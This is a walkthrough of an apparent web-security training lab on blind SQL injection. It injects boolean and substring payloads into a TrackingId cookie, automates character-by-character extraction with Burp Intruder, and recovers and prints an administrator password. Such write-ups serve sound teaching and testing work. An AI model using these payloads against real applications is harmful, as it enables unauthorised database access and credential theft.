# Blind SQL Injection with Conditional Responses

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

![](<Images/Blind SQL injection with conditional responses 0.png>)

## Solution

Navigate to the `My account` page and send the request to Burp Repeater.

![](<Images/Blind SQL injection with conditional responses 1.png>)

Notice the `Welcome back!` message displayed in the top-right corner.

Try appending a random character to the value of `TrackingId` --> the `Welcome back!` message disappears.

![](<Images/Blind SQL injection with conditional responses 2.png>)

Now try the following payload:

```sql
' and 1=1 -- -
```

![](<Images/Blind SQL injection with conditional responses 3.png>)

The query evaluates to `True` --> `Welcome back!` appears.

Next, try this payload:

```sql
' and 1=2 -- -
```

The query evaluates to `False` --> `Welcome back!` does not appear.

Based on the lab description, we already know the following information:

```text
Table name: users
Column names: username, password
User: administrator
```

Let's verify that with the following payload:

```sql
' and (select 'ahihi' from users where username='administrator')='ahihi' -- -
```

![](<Images/Blind SQL injection with conditional responses 4.png>)

Our goal is to retrieve the password of the `administrator` user.

First, let's determine the password length. I start with the following payload:

```sql
' and (select 'ahihi' from users where username='administrator' and length(password) >= 10)='ahihi' -- -
```

--> True

```sql
' and (select 'ahihi' from users where username='administrator' and length(password) > 20)='ahihi' -- -
```

--> False

Therefore, we know that:

```text
10 <= <password_length> <= 20
```

Using the Binary Search approach, I determine that the password length is `20`.

```sql
' and (select 'ahihi' from users where username='administrator' and length(password) = 20)='ahihi' -- -
```

Next, I brute-force each character of the password.

I start with the following payload to check whether the first character of the password is `a`:

```sql
' and (select substring(password,1,1) from users where username='administrator')='a' -- -
```

Then I send the request to Burp Intruder to automate the brute-force process.

Configure the attack as follows:

![](<Images/Blind SQL injection with conditional responses 5.png>)

![](<Images/Blind SQL injection with conditional responses 6.png>)

```text
Note: The Grep - Match feature is extremely useful in this scenario when you want to identify which responses contain the string 'Welcome back!'
```

Click `Start attack`.

After the brute-force process is complete, I obtain the password:

```text
zcz54u3qdcbi5ngclg2y
```

Log in using the recovered credentials, and the lab is solved.

![](<Images/Blind SQL injection with conditional responses 7.png>)